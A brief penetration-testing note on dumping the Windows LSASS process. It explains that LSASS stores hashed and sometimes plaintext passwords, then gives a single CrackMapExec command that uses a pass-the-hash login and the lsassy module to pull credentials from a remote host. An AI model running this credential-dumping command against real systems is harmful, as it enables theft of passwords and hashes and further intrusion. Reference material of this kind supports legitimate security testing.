# Dumping LSASS

Local Security Authority Subsystem Service (LSASS) is the process on Microsoft Windows that handles all user authentication, password changes, creation of access tokens, and enforcement of security policies. This means the process stores multiple forms of hashed passwords, and in some instances even stores plaintext user passwords.

```bash
cme smb $ip -u $user_admin -H $hash -M lsassy --local-auth
```

## More

{% embed url="https://pentestlab.blog/tag/lsass/" %}
